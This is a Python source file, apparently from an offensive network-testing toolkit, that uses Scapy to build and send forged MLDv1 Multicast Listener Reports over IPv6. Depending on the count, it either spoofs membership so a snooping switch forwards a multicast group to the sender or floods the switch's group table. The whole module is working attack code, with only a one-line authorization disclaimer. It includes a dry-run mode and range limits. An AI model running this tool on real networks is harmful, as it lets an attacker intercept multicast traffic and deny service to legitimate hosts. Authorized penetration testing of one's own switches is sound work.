"""MLD spoofing and flooding: send Multicast Listener Reports for groups the sender does not listen to.

Hosts tell their router which IPv6 multicast groups they want with MLD Reports (RFC 2710). A snooping
switch or bridge learns from those Reports which ports want which group, and forwards the group only
there. Reports are not authenticated on a plain Ethernet segment, so one port can claim any group:

- Spoofing: a Report for one group makes the switch forward that group's traffic to the sender's port.
- Flooding: Reports for many groups fill the switch's group table, so it cannot learn a legitimate group
  from another port.

This module sends MLDv1 Reports (type 131) from the operator's MAC, with the link-local source derived
from it, hop limit 1 and a Hop-by-Hop Router Alert option, as RFC 2710 requires. Groups are taken from
ff0e::/16 (global scope), a contiguous range starting at the base you give. A count of 1 sends a single
spoofed membership; a larger count floods the table.

The effects to measure are whether the switch learns the group on the operator's port, and whether a
legitimate group from another port is still learned after the flood.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6MLReport,
    IPv6,
    IPv6ExtHdrHopByHop,
    RouterAlert,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import link_local_from_mac

MAX_GROUPS = 8192
SCOPE_NET = ipaddress.IPv6Network("ff0e::/16")


def group_range(base_group: str, count: int) -> tuple[str, ...]:
    """`count` consecutive groups starting at base_group. Refuses ranges that leave ff0e::/16."""
    try:
        base = ipaddress.IPv6Address(base_group)
    except ValueError as exc:
        raise ValueError(f"Base group {base_group!r} is not an IPv6 address.") from exc
    if base not in SCOPE_NET:
        raise ValueError(f"Base group {base_group} must be inside ff0e::/16.")
    last = base + (count - 1)
    if last not in SCOPE_NET:
        raise ValueError(f"The range from {base_group} for {count} groups leaves ff0e::/16.")
    return tuple(str(base + offset) for offset in range(count))


def group_mac(group: str) -> str:
    """The Ethernet multicast address for an IPv6 group: 33:33 plus the last 32 bits of the group."""
    low = int(ipaddress.IPv6Address(group)) & 0xFFFFFFFF
    return "33:33:" + ":".join(f"{(low >> shift) & 0xFF:02x}" for shift in (24, 16, 8, 0))


@dataclass(frozen=True)
class MldSpoofingFloodingConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the sender's MAC (required)
    base_group: str = "ff0e::1000"      # first group of the range
    count: int = 1                      # groups reported: 1 is a spoofed membership, more floods the table
    dry_run: bool = False               # build reports but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        group_range(self.base_group, self.count)
        if not 1 <= self.count <= MAX_GROUPS:
            raise ValueError(f"Groups must be between 1 and {MAX_GROUPS}.")


@dataclass
class MldSpoofingFloodingStats:
    reports: int = 0
    status: str = ""


def build_report(source_mac: str, group: str) -> Packet:
    """One MLDv1 Report for `group`, with a link-local source, hop limit 1 and a Router Alert option."""
    source = normalize_unicast_mac(source_mac)
    return (
        Ether(src=source, dst=group_mac(group))
        / IPv6(src=link_local_from_mac(source), dst=group, hlim=1)
        / IPv6ExtHdrHopByHop(options=[RouterAlert(value=0)])
        / ICMPv6MLReport(mladdr=group)
    )


def build_reports(config: MldSpoofingFloodingConfig) -> list[Packet]:
    return [build_report(config.source_mac, group) for group in group_range(config.base_group, config.count)]


def run_mld_spoofing_flooding(
    config: MldSpoofingFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MldSpoofingFloodingStats], None],
    send: Callable[..., Any] | None = None,
) -> MldSpoofingFloodingStats:
    """Send one Report per group in the range, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = MldSpoofingFloodingStats(
            status=(
                f"Dry run: would send {config.count} MLD Report(s) from {config.source_mac} for "
                f"{config.base_group} and up. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = MldSpoofingFloodingStats()
    for frame in build_reports(config):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.reports} report(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.reports += 1
        on_progress(replace(stats))
    return stats
